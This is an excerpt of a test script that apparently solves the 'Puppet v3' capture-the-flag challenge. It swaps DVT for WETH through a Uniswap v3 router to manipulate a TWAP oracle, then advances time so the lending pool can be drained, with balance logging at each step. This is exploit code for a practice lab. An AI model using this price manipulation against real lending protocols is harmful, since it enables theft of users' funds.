...
const routerV2JSON = require("@uniswap/swap-router-contracts/artifacts/contracts/SwapRouter02.sol/SwapRouter02.json");
...
describe("[Challenge] Puppet v3", function () {
  ...
  it("Execution", async function () {
    ...
    // Simple logging function to check the balances at all times:
    async function log(logName) {
      console.log("\n \n", "Logging point: ", logName || "Unnamed");
      console.log(SEPERATOR);
      console.log("\n", "  Player's ETH balance: ", await ethers.provider.getBalance(player.address));
      console.log("   Player's DVT balance: ", await token.balanceOf(player.address));
      console.log("   Player's WETH balance: ", await weth.balanceOf(player.address), "\n");
      console.log("   Uniswap v3 pool's WETH balance: ", await weth.balanceOf(uniswapPool.address));
      console.log("   Uniswap v3 pool's DVT balance: ", await token.balanceOf(uniswapPool.address), "\n");
      console.log("   Lending pool's DVT balance: ", await token.balanceOf(lendingPool.address));
      console.log(
        "   Needed amount of WETH to drain the pool: ",
        await lendingPool.connect(player).calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE)
      );
      console.log(SEPERATOR, "\n \n");
    }

    // Logging before the initial execution
    await log("START");

    // Getting the contract instance of the Uniswap v3 router02 so we can swap DVT for WETH
    const uniswapv3Router = new ethers.Contract(UNISWAP_ROUTER_ADDRESS, routerV2JSON.abi, player);

    // Approving the Uniswap v3 router02 to spend the DVT tokens
    await token.connect(player).approve(uniswapv3Router.address, PLAYER_INITIAL_TOKEN_BALANCE);
    // Swapping DVT for WETH
    ...
    await log("AFTER SWAP | BEFORE TIME HAS PASSED");
    await time.increase(100);
    await log("AFTER SWAP | AFTER TIME HAS PASSED");
